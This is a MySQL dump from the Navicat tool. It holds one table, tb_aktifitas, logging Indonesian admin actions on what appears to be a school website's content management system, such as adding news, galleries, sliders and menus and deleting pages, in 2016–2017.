/*
 Navicat Premium Data Transfer

 Source Server         : mysql
 Source Server Type    : MySQL
 Source Server Version : 100116
 Source Host           : localhost:3306
 Source Schema         : db_consultan

 Target Server Type    : MySQL
 Target Server Version : 100116
 File Encoding         : 65001

 Date: 07/09/2018 06:43:43
*/

SET NAMES utf8mb4;
SET FOREIGN_KEY_CHECKS = 0;

-- ----------------------------
-- Table structure for tb_aktifitas
-- ----------------------------
DROP TABLE IF EXISTS `tb_aktifitas`;
CREATE TABLE `tb_aktifitas`  (
  `id_aktifitas` int(11) NOT NULL AUTO_INCREMENT,
  `id_user` int(11) NOT NULL,
  `keterangan` varchar(100) CHARACTER SET latin1 COLLATE latin1_swedish_ci NOT NULL,
  `tgl` datetime(0) NOT NULL,
  PRIMARY KEY (`id_aktifitas`) USING BTREE
) ENGINE = InnoDB AUTO_INCREMENT = 767 CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Compact;

-- ----------------------------
-- Records of tb_aktifitas
-- ----------------------------
INSERT INTO `tb_aktifitas` VALUES (1, 2, 'Menambah agenda \'Pengumpulan Soal UAS Gasal\' ', '2016-04-21 11:06:05');
INSERT INTO `tb_aktifitas` VALUES (2, 2, 'Menghapus menu ', '2016-09-24 13:07:08');
INSERT INTO `tb_aktifitas` VALUES (3, 3, 'Menambah Berita \'AKN Horas\' ', '2016-09-26 04:25:33');
INSERT INTO `tb_aktifitas` VALUES (4, 2, 'Menambah user \'Awali\' ', '2016-09-26 04:28:55');
INSERT INTO `tb_aktifitas` VALUES (5, 3, 'Menambah Berita \'ada berita baru\' ', '2016-09-26 04:40:15');
INSERT INTO `tb_aktifitas` VALUES (6, 2, 'Menambah user \'agungp\' ', '2016-09-26 04:48:29');
INSERT INTO `tb_aktifitas` VALUES (7, 2, 'mengubah user \'agungp\' ', '2016-09-26 04:51:11');
INSERT INTO `tb_aktifitas` VALUES (8, 2, 'mengubah user \'agungp\' ', '2016-09-26 04:51:53');
INSERT INTO `tb_aktifitas` VALUES (9, 2, 'Menambah user \'a\' ', '2016-09-26 04:52:59');
INSERT INTO `tb_aktifitas` VALUES (10, 2, 'Menambah user \'as\' ', '2016-09-26 04:53:13');
INSERT INTO `tb_aktifitas` VALUES (11, 2, 'Menambah user \'s\' ', '2016-09-26 05:01:53');
INSERT INTO `tb_aktifitas` VALUES (12, 2, 'Menambah user \'Administrator\' ', '2016-09-26 05:02:07');
INSERT INTO `tb_aktifitas` VALUES (13, 2, 'Mengubah Status berita ', '2016-09-26 05:16:24');
INSERT INTO `tb_aktifitas` VALUES (14, 2, 'Menerbitkan sebuah berita ', '2016-09-26 05:22:00');
INSERT INTO `tb_aktifitas` VALUES (15, 2, 'Menerbitkan sebuah berita ', '2016-09-26 05:22:14');
INSERT INTO `tb_aktifitas` VALUES (16, 2, 'Mengubah Status berita ', '2016-09-26 06:01:37');
INSERT INTO `tb_aktifitas` VALUES (17, 2, 'Mengubah Status berita ', '2016-09-26 06:13:09');
INSERT INTO `tb_aktifitas` VALUES (18, 2, 'Mengubah Status berita ', '2016-09-26 06:18:32');
INSERT INTO `tb_aktifitas` VALUES (19, 2, 'Mengubah Status berita ', '2016-09-26 06:18:45');
INSERT INTO `tb_aktifitas` VALUES (20, 2, 'Mengubah Status berita ', '2016-09-26 06:19:19');
INSERT INTO `tb_aktifitas` VALUES (21, 2, 'Mengubah Status berita ', '2016-09-26 06:19:26');
INSERT INTO `tb_aktifitas` VALUES (22, 2, 'Mengubah Status berita ', '2016-09-26 06:19:32');
INSERT INTO `tb_aktifitas` VALUES (23, 2, 'Mengubah Status berita ', '2016-09-26 06:27:47');
INSERT INTO `tb_aktifitas` VALUES (24, 2, 'Menerbitkan sebuah berita', '2016-09-26 06:27:55');
INSERT INTO `tb_aktifitas` VALUES (25, 2, 'Mengubah Status berita ', '2016-09-26 06:28:38');
INSERT INTO `tb_aktifitas` VALUES (26, 2, 'Mengubah Status berita ', '2016-09-26 06:28:52');
INSERT INTO `tb_aktifitas` VALUES (27, 2, 'Mengubah Status berita ', '2016-09-26 06:30:44');
INSERT INTO `tb_aktifitas` VALUES (28, 2, 'Mengubah Status berita ', '2016-09-26 06:30:52');
INSERT INTO `tb_aktifitas` VALUES (29, 3, 'Menambah pengumuman \'pengumuman pertama\' ', '2016-09-26 08:46:13');
INSERT INTO `tb_aktifitas` VALUES (30, 2, 'Menerbitkan sebuah ', '2016-09-26 09:10:51');
INSERT INTO `tb_aktifitas` VALUES (31, 2, 'Menerbitkan sebuah ', '2016-09-26 09:14:24');
INSERT INTO `tb_aktifitas` VALUES (32, 2, 'Menerbitkan sebuah ', '2016-09-26 09:15:33');
INSERT INTO `tb_aktifitas` VALUES (33, 2, 'Menerbitkan sebuah ', '2016-09-26 09:16:39');
INSERT INTO `tb_aktifitas` VALUES (34, 2, 'Menerbitkan sebuah ', '2016-09-26 09:17:15');
INSERT INTO `tb_aktifitas` VALUES (35, 2, 'Mengubah Status berita ', '2016-09-26 09:23:58');
INSERT INTO `tb_aktifitas` VALUES (36, 2, 'Menerbitkan sebuah 236', '2016-09-26 09:25:14');
INSERT INTO `tb_aktifitas` VALUES (37, 2, 'Menerbitkan sebuah 267', '2016-09-26 09:26:14');
INSERT INTO `tb_aktifitas` VALUES (38, 2, 'Menerbitkan sebuah berita', '2016-09-26 09:27:25');
INSERT INTO `tb_aktifitas` VALUES (39, 2, 'Menhapus File ', '2016-09-26 11:34:14');
INSERT INTO `tb_aktifitas` VALUES (40, 2, 'Menhapus File ', '2016-09-26 11:35:15');
INSERT INTO `tb_aktifitas` VALUES (41, 2, 'Menghapus Slider ', '2016-10-03 05:39:31');
INSERT INTO `tb_aktifitas` VALUES (42, 2, 'Menghapus Slider ', '2016-10-03 05:39:40');
INSERT INTO `tb_aktifitas` VALUES (43, 2, 'Mengubah Slider ', '2016-10-03 05:40:36');
INSERT INTO `tb_aktifitas` VALUES (44, 2, 'Mengubah Slider ', '2016-10-03 05:40:52');
INSERT INTO `tb_aktifitas` VALUES (45, 2, 'mengubah user \'Administrator\' ', '2016-10-03 07:19:43');
INSERT INTO `tb_aktifitas` VALUES (46, 2, 'Menambah menu ', '2016-10-03 08:09:28');
INSERT INTO `tb_aktifitas` VALUES (47, 2, 'Menghapus menu ', '2016-10-03 08:29:06');
INSERT INTO `tb_aktifitas` VALUES (48, 2, 'Menambah Berita \'Psikolog Nilai Ibu Pemutilasi Bayinya Punya Gangguan Kejiwaan Sejak Lama\' ', '2016-10-04 10:23:56');
INSERT INTO `tb_aktifitas` VALUES (49, 2, 'Menambah Berita \'Google Saja Lebih Tahu, Kali di Jakarta Bersih karena Ahok Bukan Foke\' ', '2016-10-04 10:25:29');
INSERT INTO `tb_aktifitas` VALUES (50, 2, 'Menambah Berita \'Google Saja Lebih Tahu, Kali di Jakarta Bersih karena Ahok Bukan Foke\' ', '2016-10-04 10:26:29');
INSERT INTO `tb_aktifitas` VALUES (51, 2, 'Menambah Berita \'Jika Tidak Menang pada Pilkada DKI, Bagaimana Karier Agus Yudhoyono?\' ', '2016-10-04 10:27:20');
INSERT INTO `tb_aktifitas` VALUES (52, 2, 'Menambah Berita \'Bilangin Pak Ahok, Kebakaran Nih, Kasih Duit Hok\' ', '2016-10-04 10:28:29');
INSERT INTO `tb_aktifitas` VALUES (53, 2, 'Menambah Berita \'Bilangin Pak Ahok, Kebakaran Nih, Kasih Duit Hok\' ', '2016-10-04 10:28:52');
INSERT INTO `tb_aktifitas` VALUES (54, 2, 'Menambah Berita \'Maret, Apple Luncurkan 3 Varian iPad Pro?\' ', '2016-10-04 10:30:14');
INSERT INTO `tb_aktifitas` VALUES (55, 2, 'Menambah Berita \'Videotron Porno Jakarta\' ', '2016-10-04 10:31:37');
INSERT INTO `tb_aktifitas` VALUES (56, 2, 'Menambah Berita \'Apa Itu \"Pen Pineapple Apple Pen\" yang Ramai di Medsos?\' ', '2016-10-04 10:32:44');
INSERT INTO `tb_aktifitas` VALUES (57, 2, 'Menambah Berita \'Apa Itu \' ', '2016-10-04 10:33:12');
INSERT INTO `tb_aktifitas` VALUES (58, 2, 'Menambah Berita \'I have a pen, I have an Apple, Uh! Apple pen\' ', '2016-10-04 11:02:09');
INSERT INTO `tb_aktifitas` VALUES (59, 2, 'Menambah Berita \'Videotron Porno Jakarta\' ', '2016-10-05 02:27:58');
INSERT INTO `tb_aktifitas` VALUES (60, 2, 'Mengubah Status berita ', '2016-10-05 02:30:07');
INSERT INTO `tb_aktifitas` VALUES (61, 2, 'Menambah agenda \'Pendaftaran Siswa Baru 2016\' ', '2016-10-05 04:01:39');
INSERT INTO `tb_aktifitas` VALUES (62, 2, 'Menambah agenda \'Ujian Akhir Nasional Berbasis Komputer\' ', '2016-10-05 04:02:51');
INSERT INTO `tb_aktifitas` VALUES (63, 2, 'Menambah agenda \'Try Out Persiapan UN 2017\' ', '2016-10-05 04:04:29');
INSERT INTO `tb_aktifitas` VALUES (64, 2, 'Menambah agenda \'Masa Orientasi Siswa 2017 Dalam Rangka HUT RI \' ', '2016-10-05 04:06:34');
INSERT INTO `tb_aktifitas` VALUES (65, 2, 'Menambah agenda \'Masa Orientasi Siswa 2017 Dalam Rangka HUT RI \' ', '2016-10-05 04:06:43');
INSERT INTO `tb_aktifitas` VALUES (66, 2, 'mengubah user \'Administrator\' ', '2016-10-05 06:04:34');
INSERT INTO `tb_aktifitas` VALUES (67, 2, 'mengubah user \'Administrator\' ', '2016-10-05 07:00:16');
INSERT INTO `tb_aktifitas` VALUES (68, 2, 'Menambah galery ', '2016-10-05 09:18:10');
INSERT INTO `tb_aktifitas` VALUES (69, 2, 'Menambah galery ', '2016-10-05 09:42:15');
INSERT INTO `tb_aktifitas` VALUES (70, 2, 'Menambah galery ', '2016-10-05 09:45:12');
INSERT INTO `tb_aktifitas` VALUES (71, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-06 01:53:24');
INSERT INTO `tb_aktifitas` VALUES (72, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-06 01:53:48');
INSERT INTO `tb_aktifitas` VALUES (73, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-06 01:54:07');
INSERT INTO `tb_aktifitas` VALUES (74, 2, 'Menambah galery ', '2016-10-06 04:42:25');
INSERT INTO `tb_aktifitas` VALUES (75, 2, 'Menambah galery ', '2016-10-06 05:16:06');
INSERT INTO `tb_aktifitas` VALUES (76, 2, 'Menambah galery ', '2016-10-06 05:16:27');
INSERT INTO `tb_aktifitas` VALUES (77, 2, 'Menambah galery ', '2016-10-06 05:16:39');
INSERT INTO `tb_aktifitas` VALUES (78, 2, 'Menambah galery ', '2016-10-06 05:16:47');
INSERT INTO `tb_aktifitas` VALUES (79, 2, 'Menambah galery ', '2016-10-06 05:16:51');
INSERT INTO `tb_aktifitas` VALUES (80, 2, 'Menambah galery ', '2016-10-06 05:16:55');
INSERT INTO `tb_aktifitas` VALUES (81, 2, 'Menambah galery ', '2016-10-06 06:18:53');
INSERT INTO `tb_aktifitas` VALUES (82, 2, 'Menambah galery ', '2016-10-06 06:55:33');
INSERT INTO `tb_aktifitas` VALUES (83, 2, 'Menambah galery ', '2016-10-06 06:56:01');
INSERT INTO `tb_aktifitas` VALUES (84, 2, 'Menambah galery ', '2016-10-06 06:56:33');
INSERT INTO `tb_aktifitas` VALUES (85, 2, 'Menambah galery ', '2016-10-06 06:57:07');
INSERT INTO `tb_aktifitas` VALUES (86, 2, 'Menambah galery ', '2016-10-06 06:59:21');
INSERT INTO `tb_aktifitas` VALUES (87, 2, 'Menambah galery ', '2016-10-06 07:06:25');
INSERT INTO `tb_aktifitas` VALUES (88, 2, 'Menambah galery ', '2016-10-06 10:25:26');
INSERT INTO `tb_aktifitas` VALUES (89, 2, 'Menambah galery ', '2016-10-07 04:00:21');
INSERT INTO `tb_aktifitas` VALUES (90, 2, 'Menambah galery ', '2016-10-07 04:00:30');
INSERT INTO `tb_aktifitas` VALUES (91, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-07 05:00:21');
INSERT INTO `tb_aktifitas` VALUES (92, 2, 'Menambah Berita \'Profil SMKN 1 Jenpo\' ', '2016-10-07 05:10:43');
INSERT INTO `tb_aktifitas` VALUES (93, 2, 'Menambah Berita \'Profil SMKN 1 Jenpo\' ', '2016-10-07 05:29:10');
INSERT INTO `tb_aktifitas` VALUES (94, 2, 'Menambah link luar ', '2016-10-07 06:05:04');
INSERT INTO `tb_aktifitas` VALUES (95, 2, 'Mengubah link luar ', '2016-10-07 06:37:35');
INSERT INTO `tb_aktifitas` VALUES (96, 2, 'Mengubah link luar ', '2016-10-07 06:38:16');
INSERT INTO `tb_aktifitas` VALUES (97, 2, 'Mengubah link luar ', '2016-10-07 06:38:52');
INSERT INTO `tb_aktifitas` VALUES (98, 2, 'Menghapus link ', '2016-10-07 06:43:18');
INSERT INTO `tb_aktifitas` VALUES (99, 2, 'Menghapus menu ', '2016-10-11 03:19:27');
INSERT INTO `tb_aktifitas` VALUES (100, 2, 'Menghapus menu ', '2016-10-11 03:21:53');
INSERT INTO `tb_aktifitas` VALUES (101, 2, 'Menghapus menu ', '2016-10-11 03:26:45');
INSERT INTO `tb_aktifitas` VALUES (102, 2, 'Menambah menu ', '2016-10-11 03:32:25');
INSERT INTO `tb_aktifitas` VALUES (103, 2, 'Menambah menu ', '2016-10-11 03:33:08');
INSERT INTO `tb_aktifitas` VALUES (104, 2, 'Menambah menu ', '2016-10-11 03:33:49');
INSERT INTO `tb_aktifitas` VALUES (105, 2, 'Menambah menu ', '2016-10-11 03:37:23');
INSERT INTO `tb_aktifitas` VALUES (106, 2, 'Menambah menu ', '2016-10-11 03:37:49');
INSERT INTO `tb_aktifitas` VALUES (107, 2, 'Menambah menu ', '2016-10-11 03:51:27');
INSERT INTO `tb_aktifitas` VALUES (108, 2, 'Menambah menu ', '2016-10-11 03:52:02');
INSERT INTO `tb_aktifitas` VALUES (109, 2, 'Menambah menu ', '2016-10-11 03:53:04');
INSERT INTO `tb_aktifitas` VALUES (110, 2, 'Menambah menu ', '2016-10-11 03:54:48');
INSERT INTO `tb_aktifitas` VALUES (111, 2, 'Menambah menu ', '2016-10-11 03:55:39');
INSERT INTO `tb_aktifitas` VALUES (112, 2, 'Menambah menu ', '2016-10-11 03:56:49');
INSERT INTO `tb_aktifitas` VALUES (113, 2, 'Menambah menu ', '2016-10-11 03:57:33');
INSERT INTO `tb_aktifitas` VALUES (114, 2, 'Menambah menu ', '2016-10-11 03:58:03');
INSERT INTO `tb_aktifitas` VALUES (115, 2, 'Menghapus menu ', '2016-10-13 08:10:02');
INSERT INTO `tb_aktifitas` VALUES (116, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-13 08:53:58');
INSERT INTO `tb_aktifitas` VALUES (117, 2, 'Menambah Berita \'Profil SMKN 1 Jenpo\' ', '2016-10-13 08:59:06');
INSERT INTO `tb_aktifitas` VALUES (118, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-13 08:59:21');
INSERT INTO `tb_aktifitas` VALUES (119, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-13 09:00:00');
INSERT INTO `tb_aktifitas` VALUES (120, 2, 'Mengubah Status berita ', '2016-10-13 09:14:34');
INSERT INTO `tb_aktifitas` VALUES (121, 2, 'Mengubah link luar ', '2016-10-13 09:15:39');
INSERT INTO `tb_aktifitas` VALUES (122, 2, 'Menghapus link ', '2016-10-13 09:16:12');
INSERT INTO `tb_aktifitas` VALUES (123, 2, 'Menambah Halaman \'Sekapur Sirih\' ', '2016-10-13 09:36:26');
INSERT INTO `tb_aktifitas` VALUES (124, 2, 'Menambah Halaman \'Sekapur Sirih\' ', '2016-10-13 09:36:34');
INSERT INTO `tb_aktifitas` VALUES (125, 2, 'Menambah Halaman \'Privacy Policy\' ', '2016-10-13 12:17:43');
INSERT INTO `tb_aktifitas` VALUES (126, 2, 'Menghapus menu ', '2016-10-13 12:18:43');
INSERT INTO `tb_aktifitas` VALUES (127, 2, 'mengubah user \'Pringgo Juni Saputro\' ', '2016-10-14 01:33:49');
INSERT INTO `tb_aktifitas` VALUES (128, 2, 'mengubah user \'Pringgo Juni Saputro\' ', '2016-10-14 01:34:54');
INSERT INTO `tb_aktifitas` VALUES (129, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-14 09:40:38');
INSERT INTO `tb_aktifitas` VALUES (130, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-14 09:40:42');
INSERT INTO `tb_aktifitas` VALUES (131, 2, 'Menambah Halaman \'Sekapur Sirih\' ', '2016-10-14 09:40:45');
INSERT INTO `tb_aktifitas` VALUES (132, 2, 'Menambah Halaman \'Jurusan\' ', '2016-10-14 09:40:48');
INSERT INTO `tb_aktifitas` VALUES (133, 2, 'Menambah Halaman \'Privacy Policy\' ', '2016-10-14 09:40:51');
INSERT INTO `tb_aktifitas` VALUES (134, 2, 'Menambah agenda \'Pendaftaran Siswa Baru 2016\' ', '2016-10-14 09:41:15');
INSERT INTO `tb_aktifitas` VALUES (135, 2, 'Menambah agenda \'Ujian Akhir Nasional Berbasis Komputer\' ', '2016-10-14 09:41:18');
INSERT INTO `tb_aktifitas` VALUES (136, 2, 'Menambah agenda \'Try Out Persiapan UN 2017\' ', '2016-10-14 09:41:21');
INSERT INTO `tb_aktifitas` VALUES (137, 2, 'Menambah agenda \'Masa Orientasi Siswa 2017 Dalam Rangka HUT RI \' ', '2016-10-14 09:41:24');
INSERT INTO `tb_aktifitas` VALUES (138, 2, 'Menambah Penelitian \'Sistem Penjualan Berbasis Android\' ', '2016-10-14 09:41:35');
INSERT INTO `tb_aktifitas` VALUES (139, 2, 'Menambah Penelitian \'Sistem Informasi\' ', '2016-10-14 09:41:38');
INSERT INTO `tb_aktifitas` VALUES (140, 2, 'Menambah Halaman \'Profil SMK N 1 Jenangan Ponorogo\' ', '2016-10-14 09:50:39');
INSERT INTO `tb_aktifitas` VALUES (141, 2, 'Menghapus menu ', '2016-10-14 09:51:44');
INSERT INTO `tb_aktifitas` VALUES (142, 2, 'Menambah Berita \'Psikolog Nilai Ibu Pemutilasi Bayinya Punya Gangguan Kejiwaan Sejak Lama\' ', '2016-10-14 09:54:04');
INSERT INTO `tb_aktifitas` VALUES (143, 2, 'Menambah Berita \'Google Saja Lebih Tahu, Kali di Jakarta Bersih karena Ahok Bukan Foke\' ', '2016-10-14 09:54:09');
INSERT INTO `tb_aktifitas` VALUES (144, 2, 'Menambah Berita \'Jika Tidak Menang pada Pilkada DKI, Bagaimana Karier Agus Yudhoyono?\' ', '2016-10-14 09:54:15');
INSERT INTO `tb_aktifitas` VALUES (145, 2, 'Menambah Berita \'Bilangin Pak Ahok, Kebakaran Nih, Kasih Duit Hok\' ', '2016-10-14 09:54:20');
INSERT INTO `tb_aktifitas` VALUES (146, 2, 'Menambah Berita \'Maret, Apple Luncurkan 3 Varian iPad Pro?\' ', '2016-10-14 09:54:25');
INSERT INTO `tb_aktifitas` VALUES (147, 2, 'Menambah Berita \'Maret, Apple Luncurkan 3 Varian iPad Pro?\' ', '2016-10-14 09:54:29');
INSERT INTO `tb_aktifitas` VALUES (148, 2, 'Menambah Berita \'Videotron Porno Jakarta\' ', '2016-10-14 09:54:34');
INSERT INTO `tb_aktifitas` VALUES (149, 2, 'Menambah Berita \'I have a pen, I have an Apple, Uh! Apple pen\' ', '2016-10-14 09:54:38');
INSERT INTO `tb_aktifitas` VALUES (150, 2, 'Menambah Berita \'Profil SMKN 1 Jenpo\' ', '2016-10-14 09:54:42');
INSERT INTO `tb_aktifitas` VALUES (151, 2, 'Mengubah Status berita ', '2016-10-14 09:54:49');
INSERT INTO `tb_aktifitas` VALUES (152, 2, 'Mengubah Status berita ', '2016-10-14 09:55:17');
INSERT INTO `tb_aktifitas` VALUES (153, 2, 'Menambah Berita \'Psikolog Nilai Ibu Pemutilasi Bayinya Punya Gangguan Kejiwaan Sejak Lama\' ', '2016-10-14 16:40:16');
INSERT INTO `tb_aktifitas` VALUES (154, 2, 'Mengubah Status berita ', '2016-10-14 16:41:45');
INSERT INTO `tb_aktifitas` VALUES (155, 2, 'Mengubah Status berita ', '2016-10-14 16:42:00');
INSERT INTO `tb_aktifitas` VALUES (156, 2, 'Menhapus File ', '2016-10-14 17:38:04');
INSERT INTO `tb_aktifitas` VALUES (157, 2, 'Menhapus File ', '2016-10-14 17:38:22');
INSERT INTO `tb_aktifitas` VALUES (158, 2, 'Menhapus File ', '2016-10-14 17:38:30');
INSERT INTO `tb_aktifitas` VALUES (159, 2, 'Menhapus File ', '2016-10-14 17:38:34');
INSERT INTO `tb_aktifitas` VALUES (160, 2, 'Menhapus File ', '2016-10-14 17:38:36');
INSERT INTO `tb_aktifitas` VALUES (161, 2, 'Menhapus File ', '2016-10-14 17:38:41');
INSERT INTO `tb_aktifitas` VALUES (162, 2, 'Menghapus menu ', '2016-10-15 06:40:21');
INSERT INTO `tb_aktifitas` VALUES (163, 2, 'Menghapus Slider ', '2016-10-15 06:40:27');
INSERT INTO `tb_aktifitas` VALUES (164, 2, 'Menghapus Slider ', '2016-10-15 06:40:30');
INSERT INTO `tb_aktifitas` VALUES (165, 2, 'Menghapus Slider ', '2016-10-15 06:40:55');
INSERT INTO `tb_aktifitas` VALUES (166, 2, 'Menghapus Slider ', '2016-10-15 06:41:00');
INSERT INTO `tb_aktifitas` VALUES (167, 2, 'Menghapus Slider ', '2016-10-15 06:41:02');
INSERT INTO `tb_aktifitas` VALUES (168, 2, 'Menghapus Slider ', '2016-10-15 06:41:04');
INSERT INTO `tb_aktifitas` VALUES (169, 2, 'Menghapus menu ', '2016-10-15 06:41:08');
INSERT INTO `tb_aktifitas` VALUES (170, 2, 'Menghapus menu ', '2016-10-15 06:41:15');
INSERT INTO `tb_aktifitas` VALUES (171, 2, 'Menambah Slider ', '2016-10-15 07:00:56');
INSERT INTO `tb_aktifitas` VALUES (172, 2, 'Menambah Slider ', '2016-10-15 07:52:22');
INSERT INTO `tb_aktifitas` VALUES (173, 2, 'Menambah Slider ', '2016-10-15 07:56:04');
INSERT INTO `tb_aktifitas` VALUES (174, 2, 'Menghapus Slider ', '2016-10-15 07:56:08');
INSERT INTO `tb_aktifitas` VALUES (175, 2, 'Menambah Slider ', '2016-10-15 08:01:47');
INSERT INTO `tb_aktifitas` VALUES (176, 2, 'Menambah Slider ', '2016-10-15 08:02:00');
INSERT INTO `tb_aktifitas` VALUES (177, 2, 'Menambah Slider ', '2016-10-15 08:05:58');
INSERT INTO `tb_aktifitas` VALUES (178, 2, 'Menambah Slider ', '2016-10-15 08:06:22');
INSERT INTO `tb_aktifitas` VALUES (179, 2, 'Menambah Slider ', '2016-10-15 08:06:36');
INSERT INTO `tb_aktifitas` VALUES (180, 2, 'Menambah Slider ', '2016-10-15 08:06:50');
INSERT INTO `tb_aktifitas` VALUES (181, 2, 'Menambah Slider ', '2016-10-15 08:07:03');
INSERT INTO `tb_aktifitas` VALUES (182, 2, 'Menambah Slider ', '2016-10-15 08:07:25');
INSERT INTO `tb_aktifitas` VALUES (183, 2, 'Menambah Slider ', '2016-10-15 08:12:11');
INSERT INTO `tb_aktifitas` VALUES (184, 2, 'Menambah Slider ', '2016-10-15 08:17:21');
INSERT INTO `tb_aktifitas` VALUES (185, 2, 'Menambah Slider ', '2016-10-15 08:18:23');
INSERT INTO `tb_aktifitas` VALUES (186, 2, 'Menghapus menu ', '2016-10-15 09:27:17');
INSERT INTO `tb_aktifitas` VALUES (187, 2, 'Menghapus menu ', '2016-10-15 09:28:19');
INSERT INTO `tb_aktifitas` VALUES (188, 2, 'Menghapus menu ', '2016-10-15 09:28:22');
INSERT INTO `tb_aktifitas` VALUES (189, 3, 'Menambah galery ', '2016-10-17 09:51:26');
INSERT INTO `tb_aktifitas` VALUES (190, 3, 'Menambah galery ', '2016-10-17 09:51:37');
INSERT INTO `tb_aktifitas` VALUES (191, 3, 'Menambah galery ', '2016-10-17 09:51:42');
INSERT INTO `tb_aktifitas` VALUES (192, 3, 'Menambah galery ', '2016-10-17 09:51:45');
INSERT INTO `tb_aktifitas` VALUES (193, 3, 'Menambah galery ', '2016-10-17 09:51:49');
INSERT INTO `tb_aktifitas` VALUES (194, 3, 'Menambah galery ', '2016-10-17 09:51:51');
INSERT INTO `tb_aktifitas` VALUES (195, 2, 'Menambah Berita \'Psikolog Nilai Ibu Pemutilasi Bayinya Punya Gangguan Kejiwaan Sejak Lama\' ', '2016-11-22 17:54:09');
INSERT INTO `tb_aktifitas` VALUES (196, 2, 'Menambah Berita \'Google Saja Lebih Tahu, Kali di Jakarta Bersih karena Ahok Bukan Foke\' ', '2016-11-22 18:00:11');
INSERT INTO `tb_aktifitas` VALUES (197, 2, 'Menambah Berita \'Jika Tidak Menang pada Pilkada DKI, Bagaimana Karier Agus Yudhoyono?\' ', '2016-11-22 18:00:14');
INSERT INTO `tb_aktifitas` VALUES (198, 2, 'Menambah Berita \'Bilangin Pak Ahok, Kebakaran Nih, Kasih Duit Hok\' ', '2016-11-22 18:00:50');
INSERT INTO `tb_aktifitas` VALUES (199, 2, 'Menambah Halaman \'Pengumuman Kelulusan Peserta Didik Tahun Ajaran 2016-2017\' ', '2017-05-02 11:27:50');
INSERT INTO `tb_aktifitas` VALUES (200, 2, 'Menambah menu ', '2017-05-02 11:29:13');
INSERT INTO `tb_aktifitas` VALUES (201, 2, 'Menghapus halaman ID: \'272\' ', '2017-05-02 11:32:40');
INSERT INTO `tb_aktifitas` VALUES (202, 2, 'Menghapus halaman ID: \'273\' ', '2017-05-02 11:32:41');
INSERT INTO `tb_aktifitas` VALUES (203, 2, 'Menghapus halaman ID: \'274\' ', '2017-05-02 11:32:42');
INSERT INTO `tb_aktifitas` VALUES (204, 2, 'Menghapus halaman ID: \'275\' ', '2017-05-02 11:32:43');
INSERT INTO `tb_aktifitas` VALUES (205, 2, 'Menghapus halaman ID: \'276\' ', '2017-05-02 11:32:44');
INSERT INTO `tb_aktifitas` VALUES (206, 2, 'Menghapus halaman ID: \'277\' ', '2017-05-02 11:32:45');
INSERT INTO `tb_aktifitas` VALUES (207, 2, 'Menghapus halaman ID: \'278\' ', '2017-05-02 11:32:46');
INSERT INTO `tb_aktifitas` VALUES (208, 2, 'Menghapus halaman ID: \'279\' ', '2017-05-02 11:32:47');
INSERT INTO `tb_aktifitas` VALUES (209, 2, 'Menghapus halaman ID: \'280\' ', '2017-05-02 11:32:48');
INSERT INTO `tb_aktifitas` VALUES (210, 2, 'Menghapus halaman ID: \'580\' ', '2017-05-02 11:32:48');
INSERT INTO `tb_aktifitas` VALUES (211, 2, 'Menghapus halaman ID: \'582\' ', '2017-05-02 11:32:52');
INSERT INTO `tb_aktifitas` VALUES (212, 2, 'Menghapus halaman ID: \'584\' ', '2017-05-02 11:32:52');
INSERT INTO `tb_aktifitas` VALUES (213, 2, 'Menghapus halaman ID: \'586\' ', '2017-05-02 11:32:53');
INSERT INTO `tb_aktifitas` VALUES (214, 2, 'Menghapus halaman ID: \'588\' ', '2017-05-02 11:32:54');
INSERT INTO `tb_aktifitas` VALUES (215, 2, 'Menghapus halaman ID: \'590\' ', '2017-05-02 11:32:54');
INSERT INTO `tb_aktifitas` VALUES (216, 2, 'Menghapus halaman ID: \'592\' ', '2017-05-02 11:32:55');
INSERT INTO `tb_aktifitas` VALUES (217, 2, 'Menghapus halaman ID: \'594\' ', '2017-05-02 11:32:56');
INSERT INTO `tb_aktifitas` VALUES (218, 2, 'Menghapus halaman ID: \'596\' ', '2017-05-02 11:32:57');
INSERT INTO `tb_aktifitas` VALUES (219, 2, 'Menghapus halaman ID: \'598\' ', '2017-05-02 11:32:58');
INSERT INTO `tb_aktifitas` VALUES (220, 2, 'Menghapus halaman ID: \'599\' ', '2017-05-02 11:32:58');
INSERT INTO `tb_aktifitas` VALUES (221, 2, 'Menghapus halaman ID: \'601\' ', '2017-05-02 11:32:59');
INSERT INTO `tb_aktifitas` VALUES (222, 2, 'Menghapus halaman ID: \'604\' ', '2017-05-02 11:33:01');
INSERT INTO `tb_aktifitas` VALUES (223, 2, 'Menghapus halaman ID: \'605\' ', '2017-05-02 11:33:01');
INSERT INTO `tb_aktifitas` VALUES (224, 2, 'Menghapus halaman ID: \'727\' ', '2017-05-02 11:33:02');
INSERT INTO `tb_aktifitas` VALUES (225, 2, 'Menghapus halaman ID: \'728\' ', '2017-05-02 11:33:03');
INSERT INTO `tb_aktifitas` VALUES (226, 2, 'Menghapus halaman ID: \'729\' ', '2017-05-02 11:33:04');
INSERT INTO `tb_aktifitas` VALUES (227, 2, 'Menghapus halaman ID: \'730\' ', '2017-05-02 11:33:05');
INSERT INTO `tb_aktifitas` VALUES (228, 2, 'Menghapus berita ', '2017-05-02 11:34:55');
INSERT INTO `tb_aktifitas` VALUES (229, 2, 'Menghapus berita ', '2017-05-02 11:34:55');
INSERT INTO `tb_aktifitas` VALUES (230, 2, 'Menghapus berita ', '2017-05-02 11:34:56');
INSERT INTO `tb_aktifitas` VALUES (231, 2, 'Menghapus berita ', '2017-05-02 11:34:57');
INSERT INTO `tb_aktifitas` VALUES (232, 2, 'Menghapus berita ', '2017-05-02 11:34:57');
INSERT INTO `tb_aktifitas` VALUES (233, 2, 'Menghapus berita ', '2017-05-02 11:35:01');
INSERT INTO `tb_aktifitas` VALUES (234, 2, 'Menghapus berita ', '2017-05-02 11:35:02');
